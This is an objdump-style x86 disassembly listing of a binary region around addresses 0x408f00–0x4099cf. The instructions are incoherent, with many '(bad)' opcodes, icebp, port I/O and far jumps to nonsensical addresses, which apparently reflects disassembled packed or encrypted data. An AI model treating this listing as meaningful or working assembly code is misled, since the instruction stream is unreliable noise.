  408f00:	aas    
  408f01:	mov    eax,ds:0xd90ffce
  408f06:	(bad)  
  408f07:	jne    0x408ea0
  408f09:	or     eax,0xb58f75fe
  408f0e:	adc    bh,bh
  408f10:	jo     0x408eb0
  408f12:	call   0x409010
	...
  408f3b:	add    BYTE PTR [eax],al
  408f3d:	add    ch,bl
  408f3f:	sahf   
  408f40:	(bad)  
  408f41:	jmp    0x408f47
  408f43:	rol    BYTE PTR [ecx+0x2c],cl
  408f46:	out    dx,al
  408f47:	fdiv   DWORD PTR [ebx+0x689eb0fe]
  408f4d:	icebp  
  408f4e:	inc    esi
  408f4f:	push   ds
  408f50:	(bad)  
  408f51:	(bad)  
  408f52:	cli    
  408f53:	jmp    0xb5f18f55
  408f58:	push   edx
  408f59:	mov    bh,0x3e
  408f5b:	xor    al,0x3
  408f5d:	or     edi,DWORD PTR [esi+0x47]
  408f60:	(bad)  
  408f61:	fldcw  WORD PTR [bp+si-0x3d]
  408f65:	push   DWORD PTR [eax]
  408f67:	sub    BYTE PTR [edi],cl
  408f69:	call   0xffbc8808
  408f6e:	and    DWORD PTR [eax-0x49],ebp
  408f71:	(bad)  
  408f72:	sbb    DWORD PTR [edx+0x70cae7d3],edi
  408f78:	jl     0x408f79
  408f7a:	outs   dx,BYTE PTR ds:[esi]
  408f7b:	loop   0x408ffc
  408f7d:	jge    0x408fad
  408f7f:	xor    dh,bh
  408f81:	or     al,0x66
  408f83:	inc    edx
  408f84:	rol    BYTE PTR [eax+0x3e],cl
  408f87:	ret    0x226a
  408f8a:	mov    cl,0x32
  408f8c:	add    ebp,ebx
  408f8e:	cmp    ebp,DWORD PTR [edx+0x323e0002]
  408f94:	(bad)  [edx]
  408f96:	inc    dh
  408f98:	or     DWORD PTR [edx-0x37],edx
  408f9b:	mov    edi,0x50a8e80a
  408fa0:	jl     0x408fa1
	...
  408fca:	add    BYTE PTR [eax],al
  408fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fcd:	jle    0x409018
  408fcf:	push   DWORD PTR [ecx-0x573d7951]
  408fd5:	sub    DWORD PTR [ebx+0x50],edi
  408fd8:	mov    eax,ds:0x99febf67
  408fdd:	cmp    DWORD PTR [eax+eax*1-0x38],ebp
  408fe1:	xor    al,BYTE PTR [ebx]
  408fe3:	test   DWORD PTR [esi+0x39],edi
  408fe6:	adc    BYTE PTR [eax],0x81
  408fe9:	adc    DWORD PTR [ebx-0x1],edi
  408fec:	mov    bl,0xd6
  408fee:	jns    0x408fef
  408ff0:	jno    0x408ffc
  408ff2:	ja     0x408fa9
  408ff4:	xor    bh,BYTE PTR ds:[edx-0x4b]
  408ff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ff9:	lock jp 0x408ffb
  408ffc:	pop    bx
  408ffe:	or     eax,0xb020514e
  409003:	inc    esi
  409004:	cmp    bl,BYTE PTR [ebx+0x3c]
  409007:	(bad)  
  409008:	push   edx
  409009:	fsub   QWORD PTR [eax+edi*2+0x4859601]
  409010:	ds pop ebx
  409012:	jmp    0x81904391
  409017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409018:	lock pop ds
  40901a:	outs   dx,BYTE PTR ds:[esi]
  40901b:	paddd  mm4,QWORD PTR [esi+0x1f7b8d03]
  409022:	pop    esi
  409023:	icebp  
  409024:	cmp    DWORD PTR [eax],esp
  409026:	fdiv   QWORD PTR [edi+0x16]
  409029:	add    ebx,DWORD PTR [ebx+edi*2]
  40902c:	stc    
  40902d:	mov    al,BYTE PTR [esi-0xf]
	...
  409058:	add    BYTE PTR [eax],al
  40905a:	cmc    
  40905b:	xor    bh,cl
  40905d:	dec    ebp
  40905e:	jmp    0xe601f682
  409063:	mov    ah,0xe8
  409065:	jp     0x4090ba
  409067:	pop    ds
  409068:	es icebp 
  40906a:	cmp    DWORD PTR [ebx],esi
  40906c:	aad    0x79
  40906e:	leave  
  40906f:	pop    ds
  409070:	push   ss
  409071:	icebp  
  409072:	lds    esi,FWORD PTR [edx]
  409074:	icebp  
  409075:	dec    ebp
  409076:	mov    ecx,0x4246301f
  40907b:	pop    ebx
  40907c:	xchg   esp,eax
  40907d:	mov    ds,WORD PTR [edx-0x5f8bd327]
  409083:	pop    ds
  409084:	out    dx,al
  409085:	in     eax,dx
  409086:	cdq    
  409087:	mov    cl,0xea
  409089:	jp     0x409096
  40908b:	push   ebx
  40908c:	shl    DWORD PTR [edx],1
  40908e:	sbb    DWORD PTR [edi],0x1efb8cd6
  409094:	inc    ecx
  409095:	add    BYTE PTR [edi],bh
  409097:	pop    ebx
  409098:	jmp    0xbf684c25
  40909d:	jp     0x409108
  40909f:	mov    al,BYTE PTR [eax]
  4090a1:	shl    DWORD PTR [esi+0x48e8ffe5],0x1b
  4090a8:	(bad)  
  4090aa:	cwde   
  4090ab:	pop    edx
  4090ac:	add    cl,ch
  4090ae:	push   es
  4090af:	push   edi
  4090b0:	add    ecx,ebp
  4090b2:	cmp    eax,0x3d718750
  4090b7:	pop    ebx
  4090b8:	add    BYTE PTR [ecx],dl
  4090ba:	mov    ds:0xe9418c,al
	...
  4090e7:	add    BYTE PTR [esi-0x5b880928],dh
  4090ed:	push   ds
  4090ee:	push   eax
  4090ef:	sbb    DWORD PTR [edi],0xc266ff10
  4090f5:	fsubr  st,st(7)
  4090f7:	pop    edi
  4090f8:	test   BYTE PTR [esi],bl
  4090fa:	call   FWORD PTR [ebp+ecx*4-0x1ab100e3]
  409101:	pop    edx
  409102:	add    ecx,ebp
  409104:	cmp    eax,0x673684d0
  409109:	push   ds
  40910a:	call   FWORD PTR [ecx-0x57b8042b]
  409110:	cmp    eax,0xfab8fdb3
  409115:	push   ds
  409116:	addr16 pop ss
  409118:	repnz fwait
  40911a:	add    BYTE PTR [ecx],al
  40911c:	clc    
  40911d:	out    0xff,eax
  40911f:	call   0xd8b4ac6c
  409124:	mov    ds:0x2c648c1e,eax
  409129:	sbb    eax,0x1d8cf6ff
  40912e:	jne    0x409111
  409130:	and    eax,0x17e6fcc1
  409135:	push   ds
  409136:	mov    ch,0xd9
  409138:	add    al,0x1e
  40913a:	inc    DWORD PTR [ecx+0x3e]
  40913d:	pop    esp
  40913e:	add    cl,ch
  409140:	rcr    al,0xf6
  409143:	add    BYTE PTR [ecx-0x5c],bh
  409146:	call   DWORD PTR [eax+0xf]
  409149:	cli    
  40914a:	inc    edi
  40914b:	inc    ecx
	...
  409174:	add    BYTE PTR [eax],al
  409176:	push   edi
  409177:	xor    al,BYTE PTR [eax]
  409179:	push   edx
  40917a:	es push edi
  40917c:	push   0xff1a16f6
  409181:	out    0x4f,eax
  409183:	in     eax,dx
  409184:	(bad)  
  409185:	call   FWORD PTR [edx+ebx*4+0x74]
  409189:	adc    DWORD PTR ds:0xb0858d57,edi
  40918f:	mov    eax,ds:0xa447ffff
  409194:	jne    0x40919e
  409196:	mov    edi,0xa8fffc03
  40919b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40919c:	mov    ch,0xf0
  40919e:	cdq    
  40919f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091a0:	(bad)  
  4091a1:	call   0x40227d
  4091a6:	std    
  4091a7:	outs   dx,BYTE PTR ds:[esi]
  4091a8:	call   0xffe4ec3e
  4091ad:	or     esp,DWORD PTR [edi]
  4091af:	sub    ebx,DWORD PTR [ebx]
  4091b1:	push   0x400a50
  4091b6:	(bad)  
  4091b7:	mov    cl,0x1d
  4091b9:	int    0x28
  4091bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091bc:	push   eax
  4091bd:	push   0xffffffe7
  4091bf:	or     esi,edi
  4091c1:	jne    0x409192
  4091c3:	mov    cl,0x32
  4091c5:	std    
  4091c6:	sub    BYTE PTR [eax+ebp*8-0x5ba1e7],ah
  4091cd:	push   0x400a61
  4091d2:	int    0x3f
  4091d4:	push   DWORD PTR [ebp-0x61]
  4091d7:	mov    cl,0xaa
  4091d9:	inc    BYTE PTR [eax]
	...
  409203:	add    BYTE PTR [eax+0x56c668a2],ch
  409209:	sbb    bh,bh
  40920b:	imul   esi,DWORD PTR [esp+eiz*4],0x1c3e0875
  409212:	pushf  
  409213:	(bad)  
  409214:	jns    0x409222
  409216:	jmp    0x4091dd
  409218:	(bad)  
  40921a:	add    al,0x6a
  40921c:	dec    edx
  40921d:	fucomp st(5)
  40921f:	pop    es
  409220:	push   esi
  409221:	mov    bh,0x79
  409223:	call   FWORD PTR [ecx-0x14]
  409226:	in     eax,dx
  409227:	sti    
  409228:	push   ecx
  409229:	ds or  al,0xe8
  40922c:	jmp    0x78400a26
  409231:	icebp  
  409232:	(bad)  
  409233:	call   DWORD PTR [edx+0x3e6867b9]
  409239:	xor    ch,BYTE PTR [eax-0x42]
  40923c:	sub    DWORD PTR [eax],ebp
  40923e:	pop    es
  40923f:	jmp    FWORD PTR [ebx+0x28d76b3a]
  409245:	scas   al,BYTE PTR es:[edi]
  409246:	js     0x409211
  409248:	cld    
  409249:	sub    al,BYTE PTR [ebx]
  40924b:	push   ebp
  40924c:	mov    ch,0x8e
  40924e:	test   ah,al
  409250:	push   es
  409251:	outs   dx,BYTE PTR ds:[esi]
  409252:	mov    esi,0x3323efb
  409257:	add    bl,al
  409259:	out    dx,eax
  40925a:	jbe    0x4092ac
  40925c:	push   esi
  40925d:	add    dl,ch
  40925f:	inc    eax
  409260:	ds gs out dx,al
  409263:	or     ebx,ecx
  409265:	daa    
  409266:	inc    esp
  409267:	dec    eax
	...
  409290:	add    BYTE PTR [eax],al
  409292:	jg     0x4092c6
  409294:	imul   edi,DWORD PTR [edx+0xb783df5],0xfffffffe
  40929b:	mov    esi,0x4a038918
  4092a0:	jmp    0x4092a2
  4092a2:	ds inc ebp
  4092a4:	mov    ecx,0x771e33ff
  4092a9:	jne    0x409251
  4092ab:	and    eax,0xf2a607ed
  4092b0:	push   0xe65b91ff
  4092b5:	icebp  
  4092b6:	xchg   ecx,eax
  4092b7:	xor    ebp,DWORD PTR [ecx+0x4c]
  4092ba:	sbb    DWORD PTR [eax+eiz*4],0x345b4642
  4092c1:	mov    esp,DWORD PTR [edx-0x26]
  4092c4:	lods   al,BYTE PTR ds:[esi]
  4092c5:	mov    al,0x68
  4092c7:	sbb    al,0xbe
  4092c9:	aas    
  4092ca:	mov    ebx,0x5977b6e3
  4092cf:	pop    ebx
  4092d0:	jmp    0x2c10d0d8
  4092d5:	or     BYTE PTR ds:0xbe01151b,dh
  4092db:	arpl   cx,bp
  4092dd:	lock inc edx
  4092df:	xor    ah,ch
  4092e1:	add    al,0x3e
  4092e3:	pop    ebx
  4092e4:	xchg   cl,dh
  4092e6:	cmp    DWORD PTR [esp+esi*8],ebx
  4092e9:	pop    es
  4092ea:	push   ss
  4092eb:	das    
  4092ec:	mov    ds:0x198b1977,al
  4092f1:	ja     0x40927e
  4092f3:	push   ebx
  4092f4:	push   ecx
  4092f5:	fiadd  WORD PTR [eax]
	...
  40931f:	add    BYTE PTR [eax],cl
  409321:	sbb    al,0x5e
  409323:	ins    BYTE PTR es:[edi],dx
  409324:	inc    eax
  409325:	adc    edx,DWORD PTR [esi+0x77]
  409328:	data16 cmp BYTE PTR [esi-0x43e30e3c],bl
  40932f:	pop    es
  409330:	(bad)  
  409331:	or     dh,BYTE PTR [edx]
  409333:	ja     0x409316
  409335:	shr    DWORD PTR [ebx-0x44],1
  409338:	fcomp  DWORD PTR [ebx]
  40933a:	cs in  al,dx
  40933c:	adc    ebx,DWORD PTR [edx-0x17]
  40933f:	add    edi,DWORD PTR [ebx-0x3e89d52b]
  409345:	sbb    edi,DWORD PTR [ecx+0xe13066b]
  40934b:	ja     0x409310
  40934d:	aad    0x2a
  40934f:	jbe    0x4092fa
  409351:	sbb    ebx,DWORD PTR [ecx-0x1d148a]
  409357:	not    BYTE PTR [eax]
  409359:	sbb    al,0xe8
  40935b:	jae    0x409329
  40935d:	pop    edx
  40935e:	add    BYTE PTR [eax-0x42],dh
  409361:	fdivp  st(5),st
  409363:	fimul  WORD PTR [eax]
  409365:	fwait
  409366:	(bad)  
  409368:	fcomp  DWORD PTR [edx+0x0]
  40936b:	jmp    0xc8025936
  409370:	lock sbb esi,edi
  409373:	jmp    0x4093c2
  409375:	pop    ebx
  409376:	add    cl,ch
  409378:	imul   esp,DWORD PTR [edi+0x1cff548d],0x98b6a6ff
  409382:	sub    al,0x39
	...
  4093ac:	add    BYTE PTR [eax],al
  4093ae:	push   edx
  4093af:	std    
  4093b0:	dec    esi
  4093b1:	sub    BYTE PTR [edx+0x3],al
  4093b4:	push   ecx
  4093b5:	pop    edx
  4093b6:	cmp    eax,0x2ea90b5b
  4093bb:	pop    ebp
  4093bc:	jmp    0x4093e1
  4093be:	mov    bh,0xf0
  4093c0:	shl    DWORD PTR [edi-0x70],0x1a
  4093c4:	lea    ebp,[ebx]
  4093c6:	stos   WORD PTR es:[edi],ax
  4093c8:	push   0x9c0049
  4093cd:	push   ecx
  4093ce:	push   eax
  4093cf:	into   
  4093d0:	(bad)  
  4093d1:	call   0xebb5af1a
  4093d6:	fs fwait
  4093d8:	lea    ebx,[edi+edi*2+0x19]
  4093dc:	(bad)  
  4093dd:	ds mov dh,0x9d
  4093e0:	sub    al,0x60
  4093e2:	mov    esi,0x482efdcf
  4093e7:	sbb    DWORD PTR [edi-0x1e4fd4f],0xffffff94
  4093ee:	cmp    DWORD PTR [ebx],eax
  4093f0:	cmp    al,0x22
  4093f2:	xor    BYTE PTR [edx],bl
  4093f4:	call   DWORD PTR [ecx+eiz*8+0x19]
  4093f8:	inc    DWORD PTR [eax]
  4093fa:	inc    eax
  4093fb:	cs out 0x84,eax
  4093fe:	ins    BYTE PTR es:[edi],dx
  4093ff:	xchg   ecx,eax
  409400:	(bad)  
  409401:	call   FWORD PTR [edx]
  409403:	outs   dx,BYTE PTR ds:[esi]
  409404:	push   eax
  409405:	call   0x403916
  40940a:	inc    edi
  40940b:	das    
  40940c:	(bad)  
  40940d:	jne    0x40939e
  40940f:	xchg   BYTE PTR [ecx+0xfe],ah
	...
  409439:	add    BYTE PTR [eax],al
  40943b:	add    BYTE PTR [eax-0x67861770],dl
  409441:	nop
  409442:	dec    DWORD PTR [ebp-0x16326]
  409448:	mov    al,ds:0xd3b5fe2f
  40944d:	nop
  40944e:	(bad)  
  40944f:	(bad)  
  409450:	jg     0x40940c
  409452:	mov    dl,0x0
  409454:	push   edi
  409455:	cdq    
  409456:	ror    BYTE PTR [edi],0xda
  409459:	cli    
  40945a:	std    
  40945b:	call   eax
  40945d:	(bad)  
  40945e:	mov    ch,0xbc
  409460:	ror    DWORD PTR [edi-0x33201701],0xff
  409467:	jmp    DWORD PTR [eax-0x6f014836]
  40946d:	nop
  40946e:	call   0xffd06cbc
  409473:	leave  
  409474:	push   ebp
  409475:	arpl   WORD PTR [eax],ax
  409477:	push   ebp
  409478:	mov    WORD PTR [ebx-0x6f6c3b7d],es
  40947e:	jne    0x40948c
  409480:	jg     0x409462
  409482:	retf   0x80ff
  409485:	out    0x44,al
  409487:	cld    
  409488:	in     al,dx
  409489:	popf   
  40948a:	je     0x40f3f3
  409490:	call   edi
  409492:	push   ecx
  409493:	inc    ecx
  409494:	xlat   BYTE PTR ds:[ebx]
  409495:	mov    ?,WORD PTR [ebp-0x4]
  409498:	das    
  409499:	ror    ecx,1
  40949b:	(bad)  
  40949c:	ds jno 0x409473
  40949f:	add    BYTE PTR [bx+si],al
	...
  4094ca:	leave  
  4094cb:	aam    0xc1
  4094cd:	(bad)  
  4094ce:	stc    
  4094cf:	pusha  
  4094d0:	out    dx,eax
  4094d1:	pop    es
  4094d2:	xchg   esi,eax
  4094d3:	scas   eax,DWORD PTR es:[edi]
  4094d4:	jbe    0x4094d5
  4094d6:	cdq    
  4094d7:	pop    ebx
  4094d8:	or     edi,eax
  4094da:	xchg   ecx,eax
  4094db:	or     bl,ch
  4094dd:	pop    edx
  4094de:	in     eax,dx
  4094df:	inc    edx
  4094e0:	add    al,0xff
  4094e2:	or     edi,DWORD PTR [eax]
  4094e4:	imul   ebx,DWORD PTR [ebp+0x50743084],0xffffffe6
  4094eb:	nop
  4094ec:	rol    BYTE PTR [eax+0x3e],1
  4094ef:	je     0x409566
  4094f1:	jne    0x409529
  4094f3:	sub    al,0xf0
  4094f5:	std    
  4094f6:	pop    ecx
  4094f7:	shr    BYTE PTR [edx-0x16],1
  4094fa:	js     0x4094c4
  4094fc:	jae    0x409566
  4094fe:	rcl    BYTE PTR [ebx+eax*8-0x1],cl
  409502:	inc    eax
  409503:	outs   dx,BYTE PTR ds:[esi]
  409504:	js     0x4094ee
  409506:	mov    edx,0x8eff73bc
  40950b:	pop    edx
  40950c:	lea    edx,[ebx+0x7f]
  40950f:	add    dl,bl
  409511:	(bad)  
  409512:	stos   DWORD PTR es:[edi],eax
  409513:	or     ch,BYTE PTR [ebx+0x52]
  409516:	sbb    BYTE PTR [edx-0x3ef8178c],dl
  40951c:	jae    0x40951d
  40951e:	xchg   esi,eax
  40951f:	nop
  409520:	rol    BYTE PTR [eax+0x3e],1
  409523:	mov    ecx,0xcde6fbee
  409528:	dec    eax
  409529:	push   ecx
  40952b:	shr    dl,cl
  40952d:	xchg   esi,eax
	...
  409556:	add    BYTE PTR [eax],al
  409558:	(bad)  
  409559:	ret    
  40955a:	add    dl,BYTE PTR [eax-0x1f]
  40955d:	iret   
  40955e:	or     ch,al
  409560:	(bad)  
  409562:	je     0x409563
  409564:	out    0xda,al
  409566:	cmp    al,0xff
  409568:	leave  
  409569:	pop    ebx
  40956a:	es out dx,al
  40956c:	lds    eax,FWORD PTR [ebx]
  40956e:	dec    ecx
  40956f:	cmp    eax,0x412018b9
  409574:	inc    esi
  409575:	pop    ebx
  409576:	mov    ah,0x88
  409578:	call   0xe985:0x9772cdc
  40957f:	jmp    0xbbcadc1
  409584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409585:	sbb    ch,BYTE PTR [edx]
  409587:	je     0x409512
  409589:	loop   0x4095b6
  40958b:	jo     0x409542
  40958d:	push   esi
  40958e:	es mov esp,0x33695afe
  409594:	ds (bad) 
  409596:	adc    bl,ah
  409598:	inc    ecx
  409599:	lods   eax,DWORD PTR ds:[esi]
  40959a:	sub    BYTE PTR [ecx+ecx*1],al
  40959d:	add    eax,ebp
  40959f:	mov    dh,0x3e
  4095a1:	pop    ebx
  4095a2:	loop   0x4095e7
  4095a4:	retf   0x1678
  4095a7:	pop    esp
  4095a8:	push   es
  4095a9:	sub    esp,DWORD PTR [esi+0x151b3573]
  4095af:	sbb    BYTE PTR [esi+0x7ed77e83],cl
  4095b5:	pop    ebx
  4095b6:	cmp    DWORD PTR [ebx-0x4d],esi
  4095b9:	arpl   WORD PTR [ecx+0x5b],dx
	...
  4095e3:	add    BYTE PTR [eax],al
  4095e5:	add    BYTE PTR [ebx],ah
  4095e7:	sbb    BYTE PTR [esi+0x5c],bh
  4095ea:	mov    BYTE PTR [ecx],ah
  4095ec:	jbe    0x409661
  4095ee:	adc    cl,BYTE PTR [ecx+ebp*4-0x53]
  4095f2:	or     DWORD PTR [eax],ebx
  4095f4:	data16 jae 0x409603
  4095f7:	leave  
  4095f8:	and    BYTE PTR [ebx],cl
  4095fa:	jae    0x40961a
  4095fc:	ret    
  4095fd:	or     eax,0x5be18df1
  409602:	out    dx,eax
  409603:	sbb    BYTE PTR [esi+0x73],al
  409606:	push   esp
  409607:	cmp    al,0x3e
  409609:	stc    
  40960a:	inc    ecx
  40960b:	add    eax,DWORD PTR [eax]
  40960d:	dec    esi
  40960e:	dec    esp
  40960f:	sbb    bh,bh
  409611:	ret    
  409612:	cmp    DWORD PTR [eax],ebx
  409614:	jne    0x409607
  409616:	gs ss (bad) 
  409619:	push   ds
  40961a:	sub    eax,0xb7162685
  40961f:	pop    edi
  409620:	call   0xff58c25f
  409625:	xchg   ecx,eax
  409626:	xor    ebp,DWORD PTR [ebp-0x71f316bf]
  40962c:	or     BYTE PTR [ecx],al
  40962e:	xchg   DWORD PTR [esi],edx
  409630:	(bad)  
  409631:	out    dx,al
  409632:	gs lahf 
  409634:	push   edx
  409635:	sub    BYTE PTR [edx],bh
  409637:	sbb    BYTE PTR [ebp-0xf],dh
  40963a:	adc    eax,0xecd6fd53
  40963f:	cmp    BYTE PTR [esi+0x3b],0x83
  409643:	pop    ss
  409644:	(bad)  
  409645:	cmp    al,0x62
  409647:	jmp    FWORD PTR [edx]
  409649:	mov    esp,0x0
	...
  409672:	add    BYTE PTR [eax],al
  409674:	int3   
  409675:	pop    ss
  409676:	push   0x9a6b85
  40967b:	scas   al,BYTE PTR es:[edi]
  40967c:	inc    esi
  40967d:	pop    edi
  40967e:	call   0xff58658a
  409683:	adc    DWORD PTR [eax-0x5316be57],esp
  409689:	nop
  40968a:	or     BYTE PTR [ecx-0x7900e7ae],al
  409690:	add    eax,0x42285367
  409695:	push   ss
  409696:	jne    0x409679
  409698:	jne    0x4096f9
  40969a:	std    
  40969b:	outs   dx,BYTE PTR ds:[esi]
  40969c:	mov    WORD PTR [esi],ss
  40969e:	jne    0x409705
  4096a0:	mov    WORD PTR [eax+0x1a2e5108],ss
  4096a6:	call   DWORD PTR [esi+0xc]
  4096a9:	and    al,0xc2
  4096ab:	in     eax,0x3d
  4096ad:	mov    al,0x8b
  4096af:	add    BYTE PTR [ebx-0x18f38323],cl
  4096b5:	push   cs
  4096b6:	adc    eax,0xff6a92ff
  4096bb:	jne    0x4096a8
  4096bd:	mov    DWORD PTR [ebp+0x8],esi
  4096c0:	das    
  4096c1:	retf   0xffea
  4096c4:	pop    eax
  4096c5:	mov    DWORD PTR [ebp+0xc],esi
  4096c8:	aas    
  4096c9:	in     eax,0xc4
  4096cb:	(bad)  
  4096cc:	cmp    BYTE PTR [edi-0x3e],dl
  4096cf:	or     al,0x97
  4096d1:	xor    ecx,DWORD PTR [edx-0x361db14]
  4096d7:	push   0x0
	...
  409701:	add    BYTE PTR [edi-0x67eb8a77],ah
  409707:	push   cs
  409708:	ud0    esp,edx
  40970b:	pop    edx
  40970c:	call   0xffcd46aa
  409711:	or     esp,DWORD PTR [edi+0x22895b13]
  409717:	mov    ebp,DWORD PTR [eax+0x8]
  40971a:	inc    ebx
  40971b:	sbb    bh,bh
  40971d:	(bad)  
  40971e:	adc    cl,BYTE PTR [ebx-0x7361f318]
  409724:	jmp    FWORD PTR [eax+0x57]
  409727:	pop    edx
  409728:	out    dx,eax
  409729:	mov    esi,0x8758c07
  40972e:	iret   
  40972f:	mov    ebp,0x36c8fffe
  409734:	adc    dl,BYTE PTR [esi+edx*2+0x5f]
  409738:	push   DWORD PTR [ebp-0x45]
  40973b:	mov    dh,0xf1
  40973d:	enter  0x8c98,0x68
  409741:	add    DWORD PTR [edi],esp
  409743:	jnp    0x409703
  409745:	push   eax
  409746:	cwde   
  409747:	push   cs
  409748:	pop    es
  409749:	call   0x4023db
  40974e:	(bad)  
  409750:	push   esp
  409751:	inc    ecx
  409752:	ds add al,0x70
  409755:	jne    0x409741
  409757:	fwait
  409758:	pop    edx
  409759:	enter  0x9ce1,0xdc
  40975d:	add    DWORD PTR [esi],edi
  40975f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409760:	mov    dl,0x50
  409762:	rcl    esi,1
  409764:	cli    
  409765:	out    0x0,eax
	...
  40978f:	add    BYTE PTR [ecx+0x45],bl
  409792:	jno    0x409793
  409794:	shl    esi,0x6e
  409797:	call   0xffb1d6fb
  40979c:	xchg   DWORD PTR [ecx+0x14],eax
  40979f:	add    BYTE PTR [ebx],dl
  4097a1:	jns    0x409803
  4097a3:	push   0xffc1f855
  4097a8:	cwde   
  4097a9:	mov    ?,edi
  4097ab:	out    0xe2,eax
  4097ad:	cmp    esi,DWORD PTR [ecx-0x1]
  4097b0:	mov    DWORD PTR [esi+0x34965013],ecx
  4097b6:	cmp    edi,edi
  4097b8:	jns    0x4097ee
  4097ba:	not    BYTE PTR [ebx]
  4097bc:	push   cs
  4097bd:	sub    eax,0x655607f6
  4097c2:	jno    0x4097c3
  4097c4:	popa   
  4097c5:	stos   DWORD PTR es:[edi],eax
  4097c6:	cmp    DWORD PTR [edi+edi*8+0x3],edx
  4097ca:	jo     0x409841
  4097cc:	inc    edx
  4097cd:	sbb    al,0x7d
  4097cf:	enter  0xc449,0x6f
  4097d3:	jne    0x409803
  4097d5:	push   esp
  4097d6:	pop    esp
  4097d7:	aad    0x6
  4097d9:	imul   BYTE PTR [edi-0x1]
  4097dc:	stos   DWORD PTR es:[edi],eax
  4097dd:	push   ss
  4097de:	sar    esi,cl
  4097e0:	mov    bl,0xfa
  4097e2:	pop    edx
  4097e3:	sbb    al,0x21
  4097e5:	fisubr WORD PTR [edi-0x37]
  4097e8:	cld    
  4097e9:	xor    al,BYTE PTR [ebx]
  4097eb:	push   ebp
  4097ec:	(bad)
  4097ef:	les    ecx,FWORD PTR [edx]
  4097f1:	xchg   dh,dh
  4097f3:	or     eax,DWORD PTR [eax]
	...
  40981d:	add    BYTE PTR [esi],dl
  40981f:	pop    esp
  409820:	add    eax,0xf214f93b
  409825:	inc    ebx
  409826:	push   0xffffffa1
  409828:	pusha  
  409829:	(bad)  
  40982a:	in     eax,0x83
  40982c:	jmp    0xd1166934
  409831:	sti    
  409832:	ins    DWORD PTR es:[edi],dx
  409833:	call   0xf636:0x174b70e9
  40983a:	inc    ecx
  40983b:	add    esp,DWORD PTR [edx+0x70]
  40983e:	rcl    DWORD PTR [ecx+edx*4],0x2
  409842:	ds add al,0x5f
  409845:	fisttp DWORD PTR [edi+ebp*4-0x58]
  409849:	add    ebp,DWORD PTR [ecx+0x2b700d8e]
  40984f:	arpl   WORD PTR [ecx],dx
  409851:	stc    
  409852:	cwde   
  409853:	adc    al,0xfe
  409855:	fidivr DWORD PTR [edi]
  409857:	pop    ebx
  409858:	push   es
  409859:	mov    cl,0x16
  40985b:	jne    0x4097f2
  40985d:	ret    0x1581
  409860:	pop    esp
  409861:	jo     0x4098dc
  409863:	mov    ?,ecx
  409865:	pop    ebx
  409866:	fist   WORD PTR [ebx]
  409868:	(bad)  
  409869:	outs   dx,DWORD PTR ds:[esi]
  40986a:	imul   ecx,DWORD PTR [esi+0x1ee85ccd],0x19876fc6
  409874:	icebp  
  409875:	add    ebp,ebx
  409877:	ffreep st(4)
  409879:	add    DWORD PTR [edx-0x2bfbbce9],0x5d
  409880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409881:	stc    
	...
  4098aa:	add    BYTE PTR [eax],al
  4098ac:	inc    ecx
  4098ad:	add    eax,DWORD PTR [ecx+0x60143145]
  4098b3:	leave  
  4098b4:	and    eax,0x7ed3b083
  4098b9:	pop    ebx
  4098ba:	adc    DWORD PTR [edi+0x6ee99a6d],ecx
  4098c0:	dec    ebx
  4098c1:	sbb    BYTE PTR [eax],al
  4098c3:	and    DWORD PTR [ebx],eax
  4098c5:	adc    al,0xfe
  4098c7:	hlt    
  4098c8:	add    eax,0x6967adfc
  4098cd:	adc    al,0x68
  4098cf:	push   edx
  4098d0:	or     eax,0xacc1009b
  4098d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098d6:	inc    ecx
  4098d7:	jmp    0xb203e72c
  4098dc:	add    dl,BYTE PTR [esi+edi*8]
  4098df:	mov    ah,0xd5
  4098e1:	sti    
  4098e2:	xchg   ebp,eax
  4098e3:	aaa    
  4098e4:	pop    ecx
  4098e5:	adc    al,0x68
  4098e7:	cmp    ebp,ebp
  4098e9:	call   0xe941:0xa7c89100
  4098f0:	and    BYTE PTR [esi-0x3d],cl
  4098f3:	mov    eax,ds:0x94fe1382
  4098f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098f9:	sti    
  4098fa:	jge    0x409903
  4098fc:	sub    DWORD PTR [eax+ebp*2],edx
  4098ff:	cld    
  409900:	ins    BYTE PTR es:[edi],dx
  409901:	call   0xe941:0xa7b88100
  409908:	adc    BYTE PTR [esi-0x3d],cl
  40990b:	xor    DWORD PTR [ebx+0x54fe13],eax
	...
  409939:	add    BYTE PTR [edx-0x5],dh
  40993c:	xlat   BYTE PTR gs:[ebx]
  40993e:	fcom   DWORD PTR [ebx]
  409940:	push   0x9a8cb0
  409945:	push   ecx
  409946:	pop    es
  409947:	test   al,0x41
  409949:	jmp    0x2203e72e
  40994e:	adc    DWORD PTR [ebx],0xfffffffe
  409951:	xor    al,0x42
  409953:	sti    
  409954:	dec    ebp
  409955:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409956:	test   al,0x12
  409958:	push   0x9c0c92
  40995d:	add    DWORD PTR [edi-0x52],esi
  409960:	inc    ecx
  409961:	jmp    0x103e1f6
  409966:	dec    edi
  409967:	sbb    bh,bh
  409969:	dec    BYTE PTR [edx]
  40996b:	pop    ss
  40996c:	out    0x36,eax
  40996e:	xchg   ecx,eax
  40996f:	cmp    edi,0x402d8768
  409975:	add    BYTE PTR [edi],cl
  409977:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409978:	push   ebx
  409979:	inc    ecx
  40997a:	out    0x81,eax
  40997c:	xor    eax,0xff179fc3
  409981:	dec    BYTE PTR [edx]
  409983:	pop    ss
  409984:	out    0x1e,eax
  409986:	add    DWORD PTR [ecx+0x2d1268ff],0xa3ff0040
  409990:	push   ebx
  409991:	inc    ecx
  409992:	xlat   BYTE PTR ds:[ebx]
  409993:	xor    DWORD PTR ds:0xff17efc3,0xe716cafe
  40999d:	push   es
	...
  4099c6:	add    BYTE PTR [eax],al
  4099c8:	push   ecx
  4099c9:	cmp    edi,0x402d6e68
  4099cf:	add    BYTE PTR [edi-0x58bead1f],ch
